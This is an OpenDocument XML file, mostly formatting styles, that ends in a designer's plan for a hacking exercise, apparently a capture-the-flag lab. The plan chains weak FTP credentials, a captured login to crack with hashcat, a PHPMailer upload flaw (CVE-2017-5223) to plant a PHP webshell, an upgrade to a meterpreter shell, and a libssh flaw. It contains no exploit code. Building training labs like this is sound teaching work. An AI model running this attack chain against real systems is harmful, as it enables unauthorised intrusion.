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1" svg:font-family="Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace"/>
    <style:font-face style:name="Consolas" svg:font-family="Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace"/>
    <style:font-face style:name="Lohit Devanagari1" svg:font-family="'Lohit Devanagari'"/>
    <style:font-face style:name="Menlo" svg:font-family="Menlo, Monaco, Consolas, 'liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace"/>
    <style:font-face style:name="Roboto" svg:font-family="Roboto, sans-serif"/>
    <style:font-face style:name="SFMono-Regular" svg:font-family="SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace"/>
    <style:font-face style:name="SFMono-Regular1" svg:font-family="SFMono-Regular, Menlo, Monaco, Consolas, 'liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="apple-system" svg:font-family="apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji'"/>
    <style:font-face style:name="lato" svg:font-family="lato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0pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P2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3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ea113" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0011fa13" officeooo:paragraph-rsid="0011fa13"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00141009" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00141009"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00181f3e" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0019d7c6" officeooo:paragraph-rsid="0019d7c6"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001ae19f" officeooo:paragraph-rsid="001ae19f"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#24292e" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="monospace" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0010cd18" officeooo:paragraph-rsid="000ea113"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002cdb5d" officeooo:paragraph-rsid="002cdb5d"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002d1be6" officeooo:paragraph-rsid="002d1be6"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00355afd" officeooo:paragraph-rsid="00355afd"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003c83af" officeooo:paragraph-rsid="003c83af"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003e064d" officeooo:paragraph-rsid="003e064d"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="003eca6d" officeooo:paragraph-rsid="003eca6d"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0041e380" officeooo:paragraph-rsid="0041e380"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0042bd93" officeooo:paragraph-rsid="0042bd93"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0044b5bf" officeooo:paragraph-rsid="0044b5bf"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004bc14e" officeooo:paragraph-rsid="004bc14e"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004c8cc3" officeooo:paragraph-rsid="004c8cc3"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d79c0" officeooo:paragraph-rsid="004d79c0"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="004d9e10" officeooo:paragraph-rsid="004d9e10"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a54c2" officeooo:paragraph-rsid="005a54c2"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005b86b4" officeooo:paragraph-rsid="005b86b4"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00609905" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="006b43b4"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006f9525" officeooo:paragraph-rsid="006f9525"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="007105f4" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="006ade1b"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" loext:contextual-spacing="false" fo:line-height="145%" fo:orphans="2" fo:widows="2" fo:padding="0in" fo:border="none"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#24292e" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#55585a" style:font-name="Roboto" fo:font-size="13.5pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0053e1ae" officeooo:paragraph-rsid="00523c20" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="009a57c8" officeooo:paragraph-rsid="00ba8779" fo:background-color="#f6f8fa" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Consolas1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00355afd" officeooo:paragraph-rsid="003011d6"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0065500b" officeooo:paragraph-rsid="0066b518"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="0076d908"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="007105f4"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006ade1b" officeooo:paragraph-rsid="00d221a9"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00181f3e"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000d817d" officeooo:paragraph-rsid="000d817d"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00831030" officeooo:paragraph-rsid="00831030"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="006b43b4" officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0088c969" officeooo:paragraph-rsid="0088c969" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0060b1b5" officeooo:paragraph-rsid="00a1e653"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="000d817d" officeooo:paragraph-rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="009c8fba"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a5b060"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00a7bab7"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00523c20" officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00c8b62f" officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00c9222f" officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00d0e4d8" officeooo:paragraph-rsid="00d0e4d8"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00523c20"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d3b92a"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d42155"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00d75eba"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00db54a4"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005cd9e8" officeooo:paragraph-rsid="005cd9e8"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00eeaa34" officeooo:paragraph-rsid="00eeaa34"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00f1f664" officeooo:paragraph-rsid="00f1f664"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="000ea113"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#373737" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="lato" fo:font-size="12pt" fo:letter-spacing="0.0102in" fo:font-style="normal" fo:font-weight="normal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5" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#24292e" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00831030" style:font-name-asian="Noto Sans Mono CJK SC" style:font-size-asian="10pt" style:font-name-complex="Liberation Mono" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#d73a49" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#005cc5" style:font-name="SFMono-Regular" fo:font-size="9.75pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="Liberation Serif" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T9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523c20" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T10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94e3eb" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T11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dd416e" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T12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e2edeb" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T13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95e05c" fo:background-color="#f6f8fa" loext:char-shading-value="0" style:font-size-asian="12pt" style:font-size-complex="12pt" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00523c20" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:letter-spacing="normal" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0053978b" fo:background-color="#f6f8fa" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" officeooo:rsid="000d817d"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="00132645"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="00141009"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="0015aa68"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="00181f3e"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#d73a49"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#005cc5"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="00459775"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="00523c20"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="0060b1b5"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="006256ad"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="0064dee4"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="0064f67a"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="0065500b"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0066b518"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="006ade1b"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="006e1381"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="00798105"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="007d4378"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="007fccb1"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="00849249"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties officeooo:rsid="0076d908"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties officeooo:rsid="008c30ab"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties officeooo:rsid="00966f79"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties officeooo:rsid="00983c12"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T42" style:family="text">
      <style:text-properties style:font-name="Liberation Serif" fo:font-size="12pt" officeooo:rsid="00523c20" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties officeooo:rsid="009c8fba"/>
    </style:style>
    <style:style style:name="T44" style:family="text">
      <style:text-properties officeooo:rsid="00b56e98"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties officeooo:rsid="00c27398"/>
    </style:style>
    <style:style style:name="T46" style:family="text">
      <style:text-properties officeooo:rsid="00c45d3b"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties officeooo:rsid="00c8b62f"/>
    </style:style>
    <style:style style:name="T48" style:family="text">
      <style:text-properties officeooo:rsid="00cc42ea"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties officeooo:rsid="00d221a9"/>
    </style:style>
    <style:style style:name="T50" style:family="text">
      <style:text-properties officeooo:rsid="00d4f62c"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties officeooo:rsid="00d75eba"/>
    </style:style>
    <style:style style:name="T52" style:family="text">
      <style:text-properties officeooo:rsid="00d8b953"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties officeooo:rsid="00da3a34"/>
    </style:style>
    <style:style style:name="T54" style:family="text">
      <style:text-properties officeooo:rsid="00dc43dc"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties officeooo:rsid="00ddf0c7"/>
    </style:style>
    <style:style style:name="T56" style:family="text">
      <style:text-properties officeooo:rsid="00e3abf6"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties officeooo:rsid="00e52afb"/>
    </style:style>
    <style:style style:name="T58" style:family="text">
      <style:text-properties officeooo:rsid="00e628b4"/>
    </style:style>
    <style:style style:name="T59" style:family="text">
      <style:text-properties officeooo:rsid="00e79ea6"/>
    </style:style>
    <style:style style:name="T60" style:family="text">
      <style:text-properties officeooo:rsid="00eabf85"/>
    </style:style>
    <style:style style:name="T61" style:family="text">
      <style:text-properties officeooo:rsid="00ef1a40"/>
    </style:style>
    <style:style style:name="T62" style:family="text">
      <style:text-properties officeooo:rsid="00f36b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Exercise So Far:</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P78">The main objective is to obtain the bamba recepy.</text:p>
      <text:p text:style-name="P79">Remember to delete the installation files <text:span text:style-name="T61">in /home/installations.sh</text:span>.</text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P37">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T31">WEBSERVER</text:span><text:span text:style-name="T24">: </text:span><text:span text:style-name="T34">accesible from the attacker.</text:span><text:span text:style-name="T24"> </text:span></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P31">* <text:span text:style-name="T60">Should take website templates from colorlib: </text:span><text:bookmark-start text:name="__DdeLink__857_2392804040"/><text:span text:style-name="T60">https://colorlib.com/wp/html5-and-css3-login-forms/</text:span><text:bookmark-end text:name="__DdeLink__857_2392804040"/></text:p>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P74">* <text:span text:style-name="T52">The webserver is running on https.</text:span></text:p>
      <text:p text:style-name="P74">* <text:span text:style-name="T53">S</text:span><text:span text:style-name="T52">o burp is need to intercept the communication.</text:span></text:p>
      <text:p text:style-name="P77"><text:span text:style-name="T38">* Python ftp server </text:span><text:span text:style-name="T43">with weak default creds. The ftp server has </text:span><text:span text:style-name="T45">only </text:span><text:span text:style-name="T43">read </text:span><text:span text:style-name="T45">premision</text:span><text:span text:style-name="T43">.</text:span></text:p>
      <text:p text:style-name="P74">* <text:span text:style-name="T53">In The ftp server there is a pcap file containing a sniff of http authentication to the website.</text:span></text:p>
      <text:p text:style-name="P74">* <text:span text:style-name="T53">The authentication is md5 with sult, they need to crack via hashcat.</text:span></text:p>
      <text:p text:style-name="P75">* <text:span text:style-name="T50">After login, there is the mail vulnerability – </text:span><text:span text:style-name="T54">they need to preform it with burp</text:span><text:span text:style-name="T50">.</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T24">* using th</text:span><text:span text:style-name="T42">e phpmailer vulnerability – </text:span><text:a xlink:type="simple" xlink:href="https://github.com/vulhub/vulhub/tree/master/phpmailer/CVE-2017-5223" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T41">CVE-2017-5223</text:span></text:a><text:span text:style-name="T8">, </text:span><text:span text:style-name="T9">one can upload a php webshell of choise – need them to create the python script to do the vulnerability or use burpsuit </text:span><text:span text:style-name="T10">or metasploit</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T9">* </text:span><text:span text:style-name="T11">the ftp will point </text:span><text:span text:style-name="T12">to the website</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P64"><text:span text:style-name="T14">* consider adding </text:span><text:span text:style-name="T15">phpmyadmin latest for confusion purpeses.</text:span></text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50">* <text:span text:style-name="T39">The goal is to get a meterpeter shell </text:span><text:span text:style-name="T55">from a php webshell </text:span><text:span text:style-name="T39">- </text:span></text:p>
      <text:p text:style-name="P51">This website shows how to get a meterpeter from a php webshell: <text:bookmark-start text:name="__DdeLink__850_2392804040"/><text:span text:style-name="T39">https://www.hacking.reviews/2017/02/webshell-to-meterpreter.html?m=1</text:span><text:bookmark-end text:name="__DdeLink__850_2392804040"/></text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P37"><text:bookmark-start text:name="__DdeLink__620_2786724775"/><text:bookmark-start text:name="__DdeLink__626_2786724775"/><text:bookmark-start text:name="__DdeLink__618_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__620_2786724775"/><text:bookmark-end text:name="__DdeLink__626_2786724775"/><text:bookmark-end text:name="__DdeLink__618_2786724775"/></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P45"><text:span text:style-name="T33">LibSSH vulnerability – </text:span><text:span text:style-name="T44">accesible to attacker – </text:span><text:span text:style-name="T33">.</text:span></text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P42">* libssh vulnerability that runs <text:span text:style-name="T32">as user and inside there is the creds for the file server website.</text:span></text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41"><text:span text:style-name="T35">in metasploit: </text:span>scanner/ssh/ssh_version</text:p>
